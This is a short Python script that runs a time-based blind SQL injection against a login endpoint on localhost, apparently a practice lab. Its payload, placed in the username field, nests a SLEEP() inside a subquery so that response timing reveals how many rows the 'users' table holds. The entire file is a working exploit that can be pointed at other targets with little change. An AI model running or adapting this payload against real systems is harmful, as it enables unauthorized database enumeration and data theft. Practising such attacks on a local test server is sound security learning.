import httpx
import time

TARGET_URL = "http://localhost:5000/blind"
DELAY = 10
MAX_USERS = 5  # Try higher if needed

def test_user_count():
    for i in range(1, MAX_USERS + 1):
        payload = f"' OR (SELECT IF((SELECT COUNT(*) FROM users)={i}, SLEEP({DELAY}), 0)) -- "
        try:
            print(f"[+] Testing count = {i} ...")
            start = time.time()
            r = httpx.post(TARGET_URL, data={"username": payload}, timeout=DELAY + 5)
            duration = time.time() - start
            print(f"[-] Response in {duration:.2f}s")
            if duration >= DELAY:
                print(f"[!!!] Found user count: {i}")
                return i
        except httpx.ReadTimeout:
            print(f"[!!!] ReadTimeout (server slept) => user count is likely: {i}")
            return i
    print("[-] User count not found in tested range.")
    return None

if __name__ == "__main__":
    count = test_user_count()
    print(f"[+] Done. Users in table: {count}")
